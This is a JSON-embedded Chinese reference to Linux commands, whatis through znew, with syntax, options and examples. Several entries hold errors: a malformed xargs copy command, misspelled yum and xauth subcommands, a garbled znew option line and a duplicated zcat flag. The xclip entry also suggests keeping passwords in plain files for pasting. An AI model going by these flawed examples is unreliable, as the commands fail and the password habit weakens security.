\n\n```\nwhatis\n```\n\n### 实例  \n\n```\n[root@localhost ~]# whatis ls\nls                   (1)  - list directory contents\nls                   (1p)  - list directory contents\n\n[root@localhost ~]# whatis cp\ncp                   (1)  - copy files and directories\ncp                   (1p)  - copy files\n\n[root@localhost ~]# whatis chown\nchown                (1)  - change file owner and group\nchown                (1p)  - change the file ownership\nchown                (2)  - change ownership of a file\nchown                (3p)  - change owner and group of a file\n\n[root@localhost ~]# whatis man\nman                  (1)  - format and display the on-line manual pages\nman                  (1p)  - display system documentation\nman                  (7)  - macros to format man pages\nman                 (rpm) - A set of documentation tools: man, apropos and whatis.\nman-pages           (rpm) - Man (manual) pages from the Linux Documentation Project.\nman.config [man]     (5)  - configuration data for man\n```\n\n\n"},{"name":"whereis","categoryId":6,"data":"whereis\n\u003d\u003d\u003d\n\n查找二进制程序、代码等相关文件路径\n\n## 补充说明\n\n**whereis命令** 用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。\n\nwhereis命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。\n\n和find相比，whereis查找的速度非常快，这是因为linux系统会将 系统内的所有文件都记录在一个数据库文件中，当使用whereis和下面即将介绍的locate时，会从数据库中查找数据，而不是像find命令那样，通 过遍历硬盘来查找，效率自然会很高。 但是该数据库文件并不是实时更新，默认情况下时一星期更新一次，因此，我们在用whereis和locate 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。\n\n### 语法  \n\n```\nwhereis(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：只查找二进制文件；\n-B\u003c目录\u003e：只在设置的目录下查找二进制文件；\n-f：不显示文件名前的路径名称；\n-m：只查找说明文件；\n-M\u003c目录\u003e：只在设置的目录下查找说明文件；\n-s：只查找原始代码文件；\n-S\u003c目录\u003e只在设置的目录下查找原始代码文件；\n-u：查找不包含指定类型的文件。\n```\n\n### 参数  \n\n指令名：要查找的二进制程序、源文件和man手册页的指令名。\n\n### 实例  \n\n将相关的文件都查找出来\n\n```\n[root@localhost ~]# whereis tomcat\ntomcat:\n\n[root@localhost ~]# whereis svn\nsvn: /usr/bin/svn /usr/local/svn /usr/share/man/man1/svn.1.gz\n```\n\n说明：tomcat没安装，找不出来，svn安装找出了很多相关文件\n\n只将二进制文件查找出来 \n\n```\n[root@localhost ~]# whereis -b svn\nsvn: /usr/bin/svn /usr/local/svn\n\n[root@localhost ~]# whereis -m svn\nsvn: /usr/share/man/man1/svn.1.gz\n\n[root@localhost ~]# whereis -s svn\nsvn:\n\n```\n\n说明：`whereis -m svn`查出说明文档路径，`whereis -s svn`找source源文件。\n\n\n"},{"name":"which","categoryId":6,"data":"which\n\u003d\u003d\u003d\n\n查找并显示给定命令的绝对路径\n\n## 补充说明\n\n**which命令** 用于查找并显示给定命令的绝对路径，环境变量PATH中保存了查找命令时需要遍历的目录。which指令会在环境变量$PATH设置的目录里查找符合条件的文件。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。\n\n### 语法  \n\n```\nwhich(选项)(参数)\n```\n\n### 选项  \n\n```\n-n\u003c文件名长度\u003e：制定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名；\n-p\u003c文件名长度\u003e：与-n参数相同，但此处的\u003c文件名长度\u003e包含了文件的路径；\n-w：指定输出时栏位的宽度；\n-V：显示版本信息。\n```\n\n### 参数  \n\n指令名：指令名列表。\n\n### 实例  \n\n查找文件、显示命令路径：\n\n```\n[root@localhost ~]# which pwd\n/bin/pwd\n\n[root@localhost ~]#  which adduser\n/usr/sbin/adduser\n\n```\n\n说明：which是根据使用者所配置的 PATH 变量内的目录去搜寻可运行档的！所以，不同的 PATH 配置内容所找到的命令当然不一样的！\n\n\n"},{"name":"who","categoryId":2,"data":"who\n\u003d\u003d\u003d\n\n显示目前登录系统的用户信息\n\n## 补充说明\n\n**who命令** 是显示目前登录系统的用户信息。执行who命令可得知目前有那些用户登入系统，单独执行who命令会列出登入帐号，使用的终端机，登入时间以及从何处登入或正在使用哪个X显示器。\n\n### 语法  \n\n```\nwho(选项)(参数)\n```\n\n### 选项  \n\n```\n-H或--heading：显示各栏位的标题信息列；\n-i或-u或--idle：显示闲置时间，若该用户在前一分钟之内有进行任何动作，将标示成\".\"号，如果该用户已超过24小时没有任何动作，则标示出\"old\"字符串；\n-m：此参数的效果和指定\"am i\"字符串相同；\n-q或--count：只显示登入系统的帐号名称和总人数；\n-s：此参数将忽略不予处理，仅负责解决who指令其他版本的兼容性问题；\n-w或-T或--mesg或--message或--writable：显示用户的信息状态栏；\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n### 参数  \n\n文件：指定查询文件。\n\n### 实例  \n\n```\n[root@localhost ~]# who\nroot     pts/0        2013-08-19 15:04 (192.168.0.134)\nroot     pts/1        2013-12-20 10:37 (180.111.155.40)\n\n[root@localhost ~]# who -q\nroot root\n# users\u003d2\n\n[root@localhost ~]# who -H\nNAME     LINE         time             COMMENT\nroot     pts/0        2013-08-19 15:04 (192.168.0.134)\nroot     pts/1        2013-12-20 10:37 (180.111.155.40)\n\n[root@localhost ~]# who -w\nroot     + pts/0        2013-08-19 15:04 (192.168.0.134)\nroot     + pts/1        2013-12-20 10:37 (180.111.155.40)\n```\n\n\n"},{"name":"whoami","categoryId":2,"data":"whoami\n\u003d\u003d\u003d\n\n打印当前有效的用户名称\n\n## 补充说明\n\n**whoami命令** 用于打印当前有效的用户名称，相当于执行`id -un`命令。\n\n### 语法  \n\n```\nwhoami(选项)\n```\n\n### 选项  \n\n```\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n### 实例  \n\n```\n[root@localhost ~]# whoami\nroot\n\n[root@localhost ~]# id -un\nroot\n```\n\n\n"},{"name":"write","categoryId":9,"data":"write\n\u003d\u003d\u003d\n\n向指定登录用户终端上发送信息\n\n## 补充说明\n\n**write命令** 用于向指定登录用户终端上发送信息。通过write命令可传递信息给另一位登入系统的用户，当输入完毕后，键入EOF表示信息结束，write命令就会将信息传给对方。如果接收信息的用户不只登入本地主机一次，你可以指定接收信息的终端机编号。\n\n### 语法  \n\n```\nwrite(参数)\n```\n\n### 参数  \n\n```\n用户：指定要接受信息的登录用户；\n登陆终端：指定接收信息的用户的登录终端。\n```\n\n### 实例  \n\n传信息给Rollaend，此时Rollaend只有一个连线 : \n\n```\nwrite Rollaend\n```\n\n接下来就是将信息打上去，结束请Ctrl+C：\n\n传信息给Rollaend、Rollaend的连线有pts/2、pts/3：\n\n```\nwrite Rollaend pts/2\n```\n\n接下来就是将信息打上去，结束请Ctrl+C：\n\n若对方设定`mesg n`，则此时信息将无法传给对方。\n\n\n"},{"name":"xargs","categoryId":0,"data":"xargs\n\u003d\u003d\u003d\n\n给其他命令传递参数的一个过滤器\n\n## 补充说明\n\n**xargs命令** 是给其他命令传递参数的一个过滤器，也是组合多个命令的一个工具。它擅长将标准输入数据转换成命令行参数，xargs能够处理管道或者stdin并将其转换成特定命令的命令参数。xargs也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。xargs的默认命令是echo，空格是默认定界符。这意味着通过管道传递给xargs的输入将会包含换行和空白，不过通过xargs的处理，换行和空白将被空格取代。xargs是构建单行命令的重要组件之一。\n\n### xargs命令用法  \n\nxargs用作替换工具，读取输入数据重新格式化后输出。\n\n定义一个测试文件，内有多行文本数据：\n\n```\ncat test.txt\n\na b c d e f g\nh i j k l m n\no p q\nr s t\nu v w x y z\n\n```\n\n多行输入单行输出：\n\n```\ncat test.txt | xargs\n\na b c d e f g h i j k l m n o p q r s t u v w x y z\n```\n\n **-n选项** 多行输出：\n\n```\ncat test.txt | xargs -n3\n\na b c\nd e f\ng h i\nj k l\nm n o\np q r\ns t u\nv w x\ny z\n```\n\n **-d选项** 可以自定义一个定界符：\n\n```\necho \"nameXnameXnameXname\" | xargs -dX\n\nname name name name\n```\n\n结合 **-n选项** 使用：\n\n```\necho \"nameXnameXnameXname\" | xargs -dX -n2\n\nname name\nname name\n```\n\n **读取stdin，将格式化后的参数传递给命令** \n\n假设一个命令为 sk.sh 和一个保存参数的文件arg.txt：\n\n```\n#!/bin/bash\n#sk.sh命令内容，打印出所有参数。\n\necho $*\n\n```\n\narg.txt文件内容：\n\n```\ncat arg.txt\n\naaa\nbbb\nccc\n\n```\n\nxargs的一个 **选项-I** ，使用-I指定一个替换字符串{}，这个字符串在xargs扩展时会被替换掉，当-I与xargs结合使用，每一个参数命令都会被执行一次：\n\n```\ncat arg.txt | xargs -I {} ./sk.sh -p {} -l\n\n-p aaa -l\n-p bbb -l\n-p ccc -l\n\n```\n\n复制所有图片文件到 /data/images 目录下：\n\n```\nls *.jpg | xargs -n1 -I cp {} /data/images\n```\n\n **xargs结合find使用** \n\n用rm 删除太多的文件时候，可能得到一个错误信息：/bin/rm Argument list too long. 用xargs去避免这个问题：\n\n```\nfind . -type f -name \"*.log\" -print0 | xargs -0 rm -f\n```\n\nxargs -0将\\0作为定界符。\n\n统计一个源代码目录中所有php文件的行数：\n\n```\nfind . -type f -name \"*.php\" -print0 | xargs -0 wc -l\n```\n\n查找所有的jpg 文件，并且压缩它们：\n\n```\nfind . -type f -name \"*.jpg\" -print | xargs tar -czvf images.tar.gz\n\n```\n\n **xargs其他应用** \n\n假如你有一个文件包含了很多你希望下载的URL，你能够使用xargs下载所有链接：\n\n```\ncat url-list.txt | xargs wget -c\n\n```\n\n### 子Shell（Subshells）  \n\n运行一个shell脚本时会启动另一个命令解释器.，就好像你的命令是在命令行提示下被解释的一样，类似于批处理文件里的一系列命令。每个shell脚本有效地运行在父shell(parent shell)的一个子进程里。这个父shell是指在一个控制终端或在一个xterm窗口中给你命令指示符的进程。\n\n```\ncmd1 | ( cmd2; cmd3; cmd4 ) | cmd5\n```\n\n如果cmd2 是cd /，那么就会改变子Shell的工作目录，这种改变只是局限于子shell内部，cmd5则完全不知道工作目录发生的变化。子shell是嵌在圆括号()内部的命令序列，子Shell内部定义的变量为局部变量。\n\n子shell可用于为一组命令设定临时的环境变量：\n\n```\nCOMMAND1\nCOMMAND2\nCOMMAND3\n(\n  IFS\u003d:\n  PATH\u003d/bin\n  unset TERMINFO\n  set -C\n  shift 5\n  COMMAND4\n  COMMAND5\n  exit 3 # 只是从子shell退出。\n)\n# 父shell不受影响，变量值没有更改。\nCOMMAND6\nCOMMAND7\n```\n\n\n\n"},{"name":"xauth","categoryId":0,"data":"xauth\n\u003d\u003d\u003d\n\n显示和编辑被用于连接X服务器的认证信息\n\n## 补充说明\n\n**xauth命令** 用于显示和编辑被用于连接X服务器的认证信息。\n\n### 语法  \n\n```\nxauth(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：不使用默认的认证文件，而使用指定的认证文件；\n-q：安静模式，不打印未请求的状态信息；\n-v：详细模式，打印指定的各种操作信息；\n-i：忽略认证文件锁定；\n-b：执行任何操作，终端认证文件锁定。\n```\n\n### 参数  \n\n*   add：添加认证条目到认证文件中；\n*   extract：将指定的设备内容加入到指定的密码文件中；\n*   info：显示授权文件相关信息；\n*   exit：退出交互模式；\n*   list：列出给定的显示设备的内容；\n*   merge：合并多个授权文件内容；\n*   extract：将指定设备内容写入指定的授权文件；\n*   nextrct：将指定设备内容写入指定的授权文件；\n*   nmerge：合并多个授权文件内容；\n*   remove：删除指定显示设备的授权条目；\n*   source：从指定文件读取包含xauth的内容指令。\n\n\n"},{"name":"xclip","categoryId":0,"data":"xclip\n\u003d\u003d\u003d\n\n管理 X 粘贴板\n\n## 补充说明\n\n在 X 系统里面，从一个窗口复制一段文字到另一个窗口，有两套机制，分别是 Selections 和 cut buffers。\n\n常用的 copy \u0026 paste 是利用的 cut buffers 机制;另外用鼠标选中一段文字，然后在另一个窗口按鼠标中键实现复制，利用的是 selections 机制。selection 又可以分为 master 和 slave selection。\n\n当用鼠标选中一段文件，这段文字就自动被复制到 master selection。然后在另一个地方按鼠标中键，就自动把 master selection 的内容粘贴出来。\n\n当你想复制少量文字的时候，两种方法都是很方便的。但是当复制大段文字的时候就挺麻烦。另外就是你可能会频繁的执行一些复制粘贴工作，不停的用鼠标选中文字，然后再粘贴。这是对手指的折磨。\n\n我忍受不了这种折磨，所以发现了 xclip， 方便的管理 X selections 里面内容的工具。\n\n比如如下命令就把文件 /etc/passwd 的内容复制到 X master selections 里面了。\n\n```\nxclip -i /etc/passwd\n\n```\n\n然后到别的地方就能复制出来，利用鼠标中键。或者是更舒服的 shift+insert。 我现在最常用的方法是通过键盘绑定来管理 X master selections 的内容。比如 alt+F1 就能把我的 ~/f1 的内容复制到 X master selections，alt+F2 复制 ~/f2 的内容。这样就能把你需要经常用到的内容方便的进行复制粘贴。比如常用的密码啥的。\n\n\n"},{"name":"xhost","categoryId":0,"data":"xhost\n\u003d\u003d\u003d\n\n制哪些X客户端能够在X服务器上显示\n\n## 补充说明\n\n**xhost命令** 是X服务器的访问控制工具，用来控制哪些X客户端能够在X服务器上显示。该命令必须从有显示连接的机器上运行。可以通过使用`-host`参数，从访问列表中除去一个名称。不要从访问列表中除去当前的名称。如果已经这样做了，请在作出任何更改之前注销系统。\n\n### 语法  \n\n```\nxhost(参数)\n```\n\n### 参数  \n\n*   +：关闭访问控制，允许任何主机访问本地的X服务器；\n*   -：打开访问控制，仅允许授权清单中的主机访问本地的X服务器。\n\n输入无变量的xhost命令将显示访问X服务器的当前主机名，并显示一条消息表明访问是否已启用。\n\n为了安全起见，只能从控制主机运行影响访问控制的选项。对于工作站来说，这台机器也就是服务器。对于X终端来说，这台机器是登录主机。\n\n要在缺省情况下启用远程名称，可以在`/etc/X?.hosts`文件中定义名称，其中`?`为启用访问的显示器号。\n\n例如，显示器`jeanne:0`可以由使用jeanne的缺省主机名的系统上的`/etc/X0.hosts`文件中定义的系统访问。在显示名称和文件名中，0表明已定义的远程系统允许通过增强X-Windows访问的显示器号。\n\n注意：`-name`参数，定义要从X服务器访问列表中除去的主机名。已有的连接没有被中断，但将拒绝新的连接请求。注意：可以除去当前的机器；然而，不允许进行进一步的连接（包括试图将其添加回来）。再一次启用本地连接的唯一方法就是将服务器复位（因此也会中断所有连接）。\n\n\n"},{"name":"xinit","categoryId":0,"data":"xinit\n\u003d\u003d\u003d\n\n是Linux下X-Window系统的初始化程序\n\n## 补充说明\n\n**xinit命令** 是Linux下X-Window系统的初始化程序，主要完成X服务器的初始化设置。\n\n### 语法  \n\n```\nxinit(参数)\n```\n\n### 参数  \n\n*   客户端选项：客户端指令及选项；\n*   --：用于区分客户端选项和服务器端选项；\n*   服务器端选项：服务器端选项指令及选项。\n\n\n"},{"name":"xlsatoms","categoryId":5,"data":"xlsatoms\n\u003d\u003d\u003d\n\n列出X服务器内部所有定义的原子成分\n\n## 补充说明\n\n**xlsatoms命令** 用于列出X服务器内部所有定义的原子成分，每个原子成分都有自身的编号。可利用参数设置列表范围，或直接指定欲查询的成分名称。\n\n### 语法  \n\n```\nxlsatoms(选项)\n```\n\n### 选项  \n\n*   -display\u003c显示器编号\u003e：指定X Server连接的显示器编号，该编号由\"0\"开始计算，依序递增；\n*   -format\u003c输出格式\u003e：设置成分清单的列表格式，您可使用控制字符改变显示样式；\n*   -name\u003c成分名称\u003e：列出指定的成分；\n*   -range\u003c列表范围\u003e：设置成分清单的列表范围。\n\n\n"},{"name":"xlsclients","categoryId":5,"data":"xlsclients\n\u003d\u003d\u003d\n\n列出显示器中的客户端应用程序\n\n## 补充说明\n\n**xlsclients命令** 用来列出显示器中的客户端应用程序。\n\n### 语法  \n\n```\nxlsclients(选项)\n```\n\n### 选项  \n\n```\n-a：列出所有显示器的客户端应用程序信息；\n-display\u003c显示器编号\u003e：指定X Server连接的显示器编号，该编号由\"0\"开始计算，依序递增；\n-l：使用详细格式列表；\n-m\u003c最大指令长度\u003e：设置显示指令信息的最大长度，单位以字符计算。\n```\n\n\n"},{"name":"xlsfonts","categoryId":5,"data":"xlsfonts\n\u003d\u003d\u003d\n\n列出X Server使用的字体\n\n## 补充说明\n\n**xlsfonts命令** 列出X Server使用的字体，也能使用范本样式仅列出的符合条件的字体。\n\n### 语法  \n\n```\nxlsfonts(选项)\n```\n\n### 选项  \n\n```\n-l：除字体名称外，同时列出字体的属性；\n-ll：此参数的效果和指定\"l\"参数类似，但显示更详细的信息；\n-lll：此参数的效果和指定\"ll\"参数类似，但显示更详细的信息；\n-m：配合参数\"-l\"使用时，一并列出字体大小的上下限；\n-n\u003c显示栏位数\u003e：设置每列显示的栏位数；\n-o：以OpenFont的形式列出字体清单；\n-u：列出字体清单时不依照其名称排序；\n-w\u003c每列字符数\u003e：设置每列的最大字符数。\n```\n\n\n"},{"name":"xset","categoryId":0,"data":"xset\n\u003d\u003d\u003d\n\n设置X-Window系统中的用户爱好的实用工具\n\n## 补充说明\n\n**xset命令** 是设置X-Window系统中的用户爱好的实用工具。\n\n### 语法  \n\n```\nxset(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：蜂鸣器开关设置；\n-c：键盘按键声响设置。\n```\n\n### 参数  \n\n*   c：键盘按键声响设置；\n*   s：屏幕保护程序设置。\n\n\n"},{"name":"yes","categoryId":0,"data":"yes\n\u003d\u003d\u003d\n\n重复打印指定字符串\n\n## 补充说明\n\n**yes命令** 在命令行中输出指定的字符串，直到yes进程被杀死。不带任何参数输入yes命令默认的字符串就是y。\n\n### 语法  \n\n```\nyes(参数)\n```\n\n### 参数  \n\n字符串：指定要重复打印的字符串。\n\n### 实例  \n\n```\n[root@localhost ~]# yes testline\n\ntestline\ntestline\ntestline\ntestline\ntestline\ntestline\ntestline\ntestline\n...一直重复打印 testline，按Ctrl+C结束。\n```\n\n\n"},{"name":"ypdomainname","categoryId":0,"data":"ypdomainname\n\u003d\u003d\u003d\n\n显示主机的NIS的域名\n\n## 补充说明\n\n**ypdomainname命令** 显示主机的NIS的域名。\n\n### 语法  \n\n```\nypdomainname(选项)\n```\n\n### 选项  \n\n```\n-v：详细信息模式。\n```\n\n\n"},{"name":"yum","categoryId":0,"data":"yum\n\u003d\u003d\u003d\n\n基于RPM的软件包管理器\n\n## 补充说明\n\n**yum命令** 是在Fedora和RedHat以及SUSE中基于rpm的软件包管理器，它可以使系统管理人员交互和自动化地更细与管理RPM软件包，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。\n\nyum提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。\n\n### 语法  \n\n```\nyum(选项)(参数)\n```\n\n### 选项  \n\n```\n-h：显示帮助信息；\n-y：对所有的提问都回答“yes”；\n-c：指定配置文件；\n-q：安静模式；\n-v：详细模式；\n-d：设置调试等级（0-10）；\n-e：设置错误等级（0-10）；\n-R：设置yum处理一个命令的最大等待时间；\n-C：完全从缓存中运行，而不去下载或者更新任何头文件。\n```\n\n### 参数  \n\n```\ninstall：安装rpm软件包；\nupdate：更新rpm软件包；\ncheck-update：检查是否有可用的更新rpm软件包；\nremove：删除指定的rpm软件包；\nlist：显示软件包的信息；\nsearch：检查软件包的信息；\ninfo：显示指定的rpm软件包的描述信息和概要信息；\nclean：清理yum过期的缓存；\nshell：进入yum的shell提示符；\nresolvedep：显示rpm软件包的依赖关系；\nlocalinstall：安装本地的rpm软件包；\nlocalupdate：显示本地rpm软件包进行更新；\ndeplist：显示rpm软件包的所有依赖关系。\n```\n\n### 实例  \n\n部分常用的命令包括：\n\n*   自动搜索最快镜像插件：`yum install yum-fastestmirror`\n*   安装yum图形窗口插件：`yum install yumex`\n*   查看可能批量安装的列表：`yum grouplist`\n\n**安装** \n\n```\nyum install              #全部安装\nyum install package1     #安装指定的安装包package1\nyum groupinsall group1   #安装程序组group1\n```\n\n**更新和升级** \n\n```\nyum update               #全部更新\nyum update package1      #更新指定程序包package1\nyum check-update         #检查可更新的程序\nyum upgrade package1     #升级指定程序包package1\nyum groupupdate group1   #升级程序组group1\n```\n\n**查找和显示** \n\n```\nyum info package1      #显示安装包信息package1\nyum list               #显示所有已经安装和可以安装的程序包\nyum list package1      #显示指定程序包安装情况package1\nyum groupinfo group1   #显示程序组group1信息yum search string 根据关键字string查找安装包\n```\n\n**删除程序** \n\n```\nyum remove \u0026#124; erase package1   #删除程序包package1\nyum groupremove group1             #删除程序组group1\nyum deplist package1               #查看程序package1依赖情况\n```\n\n**清除缓存** \n\n```\nyum clean packages       #清除缓存目录下的软件包\nyum clean headers        #清除缓存目录下的 headers\nyum clean oldheaders     #清除缓存目录下旧的 headers\n```\n\n\n\n"},{"name":"zcat","categoryId":0,"data":"zcat\n\u003d\u003d\u003d\n\n显示压缩包中文件的内容\n\n## 补充说明\n\n**zcat命令** 用于不真正解压缩文件，就能显示压缩包中文件的内容的场合。\n\n### 语法  \n\n```\nzcat(选项)(参数)\n```\n\n### 选项  \n\n```\n-S：指定gzip格式的压缩包的后缀。当后缀不是标准压缩包后缀时使用此选项；\n-c：将文件内容写到标注输出；\n-d：执行解压缩操作；\n-l：显示压缩包中文件的列表；\n-L：显示软件许可信息；\n-q：禁用警告信息；\n-r：在目录上执行递归操作；\n-t：测试压缩文件的完整性；\n-V：显示指令的版本信息；\n-l：更快的压缩速度；\n-9：更高的压缩比。\n```\n\n### 参数  \n\n文件：指定要显示其中文件内容的压缩包。\n\n\n"},{"name":"zfore","categoryId":0,"data":"zfore\n\u003d\u003d\u003d\n\n强制为gzip格式的压缩文件添加.gz后缀\n\n## 补充说明\n\n**zfore命令** 强制为gzip格式的压缩文件添加“.gz”后缀。\n\n### 语法  \n\n```\nzfore(参数)\n```\n\n### 参数  \n\n文件列表：指定要添加“.gz”后缀的gzip压缩文件。\n\n\n"},{"name":"zip","categoryId":10,"data":"zip\n\u003d\u003d\u003d\n\n可以用来解压缩文件\n\n## 补充说明\n\n**zip命令** 可以用来解压缩文件，或者对文件进行打包操作。zip是个使用广泛的压缩程序，文件经它压缩后会另外产生具有“.zip”扩展名的压缩文件。\n\n### 语法  \n\n```\nzip(选项)(参数)\n```\n\n### 选项  \n\n```\n-A：调整可执行的自动解压缩文件；\n-b\u003c工作目录\u003e：指定暂时存放文件的目录；\n-c：替每个被压缩的文件加上注释；\n-d：从压缩文件内删除指定的文件；\n-D：压缩文件内不建立目录名称；\n-f：此参数的效果和指定“-u”参数类似，但不仅更新既有文件，如果某些文件原本不存在于压缩文件内，使用本参数会一并将其加入压缩文件中；\n-F：尝试修复已损坏的压缩文件；\n-g：将文件压缩后附加在已有的压缩文件之后，而非另行建立新的压缩文件；\n-h：在线帮助；\n-i\u003c范本样式\u003e：只压缩符合条件的文件；\n-j：只保存文件名称及其内容，而不存放任何目录名称；\n-J：删除压缩文件前面不必要的数据；\n-k：使用MS-DOS兼容格式的文件名称；\n-l：压缩文件时，把LF字符置换成LF+CR字符；\n-ll：压缩文件时，把LF+cp字符置换成LF字符；\n-L：显示版权信息；\n-m：将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中；\n-n\u003c字尾字符串\u003e：不压缩具有特定字尾字符串的文件；\n-o：以压缩文件内拥有最新更改时间的文件为准，将压缩文件的更改时间设成和该文件相同；\n-q：不显示指令执行过程；\n-r：递归处理，将指定目录下的所有文件和子目录一并处理；\n-S：包含系统和隐藏文件；\n-t\u003c日期时间\u003e：把压缩文件的日期设成指定的日期；\n-T：检查备份文件内的每个文件是否正确无误；\n-u：更换较新的文件到压缩文件内；\n-v：显示指令执行过程或显示版本信息；\n-V：保存VMS操作系统的文件属性；\n-w：在文件名称里假如版本编号，本参数仅在VMS操作系统下有效；\n-x\u003c范本样式\u003e：压缩时排除符合条件的文件；\n-X：不保存额外的文件属性；\n-y：直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；\n-z：替压缩文件加上注释；\n-$：保存第一个被压缩文件所在磁盘的卷册名称；\n-\u003c压缩效率\u003e：压缩效率是一个介于1~9的数值。\n```\n\n### 参数  \n\n*   zip压缩包：指定要创建的zip压缩包；\n*   文件列表：指定要压缩的文件列表。\n\n### 实例  \n\n将`/home/Blinux/html/`这个目录下所有文件和文件夹打包为当前目录下的html.zip：\n\n```\nzip -q -r html.zip /home/Blinux/html\n```\n\n上面的命令操作是将绝对地址的文件及文件夹进行压缩，以下给出压缩相对路径目录，比如目前在Bliux这个目录下，执行以下操作可以达到以上同样的效果：\n\n```\nzip -q -r html.zip html\n```\n\n比如现在我的html目录下，我操作的zip压缩命令是：\n\n```\nzip -q -r html.zip *\n```\n\n\n"},{"name":"zipinfo","categoryId":10,"data":"zipinfo\n\u003d\u003d\u003d\n\n用来列出压缩文件信息\n\n## 补充说明\n\n**zipinfo命令** 用来列出压缩文件信息。执行zipinfo指令可得知zip压缩文件的详细信息。\n\n### 语法  \n\n```\nzipinfo(选项)(参数)\n```\n\n### 选项  \n\n```\n-1：只列出文件名称；\n-2：此参数的效果和指定“-1”参数类似，但可搭配“-h”，“-t”和“-z”参数使用；\n-h：只列出压缩文件的文件名称；\n-l：此参数的效果和指定“-m”参数类似，但会列出原始文件的大小而非每个文件的压缩率；\n-m：此参数的效果和指定“-s”参数类似，但多会列出每个文件的压缩率；\n-M：若信息内容超过一个画面，则采用类似more指令的方式列出信息；\n-s：用类似执行“ls-l”指令的效果列出压缩文件内容；\n-t：只列出压缩文件内所包含的文件数目，压缩前后的文件大小及压缩率；\n-T：将压缩文件内每个文件的日期时间用年，月，日，时，分，秒的顺序列出；\n-v：详细显示压缩文件内每一个文件的信息；\n-x\u003c范本样式\u003e：不列出符合条件的文件的信息；\n-z：如果压缩文件内含有注释，就将注释显示出来。\n```\n\n### 参数  \n\n文件：指定zip格式的压缩包。\n\n\n"},{"name":"zipsplit","categoryId":0,"data":"zipsplit\n\u003d\u003d\u003d\n\n将较大的zip压缩包分割成各个较小的压缩包\n\n## 补充说明\n\n**zipsplit命令** 用于将较大的“zip”压缩包分割成各个较小的“zip”压缩包。\n\n### 语法  \n\n```\nzipsplit(选项)(参数)\n```\n\n### 选项  \n\n```\n-n：指定分割后每个zip文件的大小；\n-t：报告将要产生的较小的zip文件的大小；\n-b：指定分割后的zip文件的存放位置。\n```\n\n### 参数  \n\n文件：指定要分割的zip压缩包。\n\n\n"},{"name":"znew","categoryId":0,"data":"znew\n\u003d\u003d\u003d\n\n将.Z压缩包重新转化为gzip命令压缩的.gz压缩包\n\n## 补充说明\n\n**znew命令** 用于将使用compress命令压缩的“.Z”压缩包重新转化为使用gzip命令压缩的“.gz”压缩包。\n\n### 语法  \n\n```\nznew(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：强制执行转换操作，即是目标“.gz”已经存在；\n-t：删除原文件前测试新文件；\n-v：显示文件名和每个文件的压缩比；\n-9：食用油花的压缩比，速度较慢；\n-P：使用管道完成转换操作，以降低磁盘空间使用；\n-K：当“.Z”文件比“.gz”文件小时，保留“.Z”文件。\n```\n\n### 参数  \n\n文件：指定compress指令压缩生成的“.Z”压缩包。\n\n\n"}]